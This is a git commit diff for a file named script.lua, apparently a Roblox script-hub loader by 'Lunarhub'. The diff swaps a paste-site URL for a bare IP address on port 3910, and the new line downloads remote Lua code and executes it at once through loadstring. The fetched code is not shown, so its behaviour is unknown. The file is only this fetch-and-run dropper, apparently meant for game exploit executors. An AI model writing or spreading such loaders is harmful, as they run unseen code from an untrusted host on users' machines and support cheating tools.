694d69bc00ec602c22af413b21c62e5d506bf2c0
Lunarhub <vannessyang1123@gmail.com>
2025-08-24 02:05:35 -0400

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/jcbCnsXvJmuEc66J/raw", true))()
+ID="53e7876c-95b5-44cc-8144-b449ff54c755";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
